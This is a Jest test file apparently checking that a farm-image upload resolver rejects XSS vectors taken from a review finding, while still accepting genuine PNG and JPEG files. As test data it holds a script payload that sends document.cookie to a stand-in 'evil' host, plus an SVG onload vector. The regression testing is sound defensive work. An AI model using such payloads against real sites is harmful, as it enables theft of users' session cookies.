import { FarmStatus, Role } from '@/types';

const mockGetFarmById = jest.fn();
const mockGetCurrentUser = jest.fn();
const mockUploadBytes = jest.fn();
const mockGetFile = jest.fn();
const mockCreateFileRecord = jest.fn();

jest.mock('@/services/implementations/farmService', () => ({
  __esModule: true,
  default: jest.fn().mockImplementation(() => ({ getFarmById: mockGetFarmById })),
}));
jest.mock('@/services/implementations/userService', () => ({
  __esModule: true,
  default: jest.fn().mockImplementation(() => ({ getCurrentUser: mockGetCurrentUser })),
}));
jest.mock('@/services/implementations/fileStorageService', () => ({
  __esModule: true,
  default: jest.fn().mockImplementation(() => ({
    uploadBytes: mockUploadBytes,
    getFile: mockGetFile,
  })),
}));
jest.mock('@/services/implementations/storedFileService', () => ({
  __esModule: true,
  default: jest.fn().mockImplementation(() => ({ createFileRecord: mockCreateFileRecord })),
}));

import fileStorageResolvers from '@/graphql/resolvers/fileStorageResolvers';

const uploadFarmImage = fileStorageResolvers.Mutation.uploadFarmImage as (
  parent: unknown,
  args: { farmId: string; originalFileName: string; contentType: string; dataBase64: string },
  context: { firebaseUid?: string }
) => Promise<unknown>;

const XSS = Buffer.from("<script>fetch('https://evil/'+document.cookie)</script>").toString(
  'base64'
);

beforeEach(() => {
  jest.clearAllMocks();
  mockGetFarmById.mockResolvedValue({
    id: 'farm-1',
    owner_user_id: 'owner-1',
    status: FarmStatus.APPROVED,
  });
  mockGetCurrentUser.mockResolvedValue({ id: 'owner-1', role: Role.FARMER, is_verified: true });
  mockUploadBytes.mockResolvedValue(undefined);
  mockGetFile.mockResolvedValue('https://signed.example/read');
});

// The exact payloads from the review finding, fired by the farm's legitimate owner.
describe('XSS vectors from the review finding', () => {
  test('blocks HTML declared as text/html', async () => {
    await expect(
      uploadFarmImage(
        null,
        {
          farmId: 'farm-1',
          originalFileName: 'logo.png',
          contentType: 'text/html',
          dataBase64: XSS,
        },
        { firebaseUid: 'fb-owner' }
      )
    ).rejects.toThrow();
    expect(mockUploadBytes).not.toHaveBeenCalled();
  });

  test('blocks scriptable SVG', async () => {
    await expect(
      uploadFarmImage(
        null,
        {
          farmId: 'farm-1',
          originalFileName: 'x.svg',
          contentType: 'image/svg+xml',
          dataBase64: Buffer.from('<svg onload="alert(1)"/>').toString('base64'),
        },
        { firebaseUid: 'fb-owner' }
      )
    ).rejects.toThrow();
    expect(mockUploadBytes).not.toHaveBeenCalled();
  });

  // The vector an allowlist alone would miss.
  test('blocks HTML bytes lying about being image/png', async () => {
    await expect(
      uploadFarmImage(
        null,
        {
          farmId: 'farm-1',
          originalFileName: 'logo.png',
          contentType: 'image/png',
          dataBase64: XSS,
        },
        { firebaseUid: 'fb-owner' }
      )
    ).rejects.toThrow();
    expect(mockUploadBytes).not.toHaveBeenCalled();
  });

  test('blocks oversized uploads', async () => {
    const big = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.alloc(11 * 1024 * 1024),
    ]);
    await expect(
      uploadFarmImage(
        null,
        {
          farmId: 'farm-1',
          originalFileName: 'big.png',
          contentType: 'image/png',
          dataBase64: big.toString('base64'),
        },
        { firebaseUid: 'fb-owner' }
      )
    ).rejects.toThrow();
    expect(mockUploadBytes).not.toHaveBeenCalled();
  });

  // Guard against the fix being so strict it breaks the happy path.
  test('still accepts a real PNG', async () => {
    mockCreateFileRecord.mockResolvedValue({
      id: 'f1',
      storage_key: 'farms/farm-1/f1',
      original_file_name: 'a.png',
      owner_user_id: 'owner-1',
      farm_id: 'farm-1',
      content_type: 'image/png',
    });
    await uploadFarmImage(
      null,
      {
        farmId: 'farm-1',
        originalFileName: 'a.png',
        contentType: 'image/png',
        dataBase64: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]).toString(
          'base64'
        ),
      },
      { firebaseUid: 'fb-owner' }
    );
    expect(mockUploadBytes).toHaveBeenCalledTimes(1);
  });

  test('still accepts a real JPEG', async () => {
    mockCreateFileRecord.mockResolvedValue({
      id: 'f2',
      storage_key: 'farms/farm-1/f2',
      original_file_name: 'a.jpg',
      owner_user_id: 'owner-1',
      farm_id: 'farm-1',
      content_type: 'image/jpeg',
    });
    await uploadFarmImage(
      null,
      {
        farmId: 'farm-1',
        originalFileName: 'a.jpg',
        contentType: 'image/jpeg',
        dataBase64: Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00]).toString('base64'),
      },
      { firebaseUid: 'fb-owner' }
    );
    expect(mockUploadBytes).toHaveBeenCalledTimes(1);
  });
});
